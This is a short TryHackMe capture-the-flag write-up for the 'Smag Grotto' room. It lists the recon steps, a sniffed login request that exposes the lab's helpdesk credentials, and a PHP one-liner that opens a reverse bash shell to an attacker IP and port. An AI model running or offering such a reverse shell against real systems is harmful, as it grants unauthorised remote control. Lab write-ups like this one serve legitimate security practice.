#   Tryhackme - Smag Grotto
##  IP=10.10.188.153

##  Steps:
1.  Nmap
2.  Gobuster
3.  Wireshark
4.  See some Docs

##  Notes
```
Wireshark -->

POST /login.php HTTP/1.1
Host: development.smag.thm
User-Agent: curl/7.47.0
Accept: */*
Content-Length: 39
Content-Type: application/x-www-form-urlencoded

username=helpdesk & password=cH4nG3M3_n0w HTTP/1.1 200 OK
Date: Wed, 03 Jun 2020 18:04:07 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 0
Content-Type: text/html; charset=UTF-8


PHP reverse shell: 

php -r '$sock=fsockopen("10.17.28.202",4444);exec("/bin/bash -i <&3 >&3 2>&3");'

```

##  Room Done!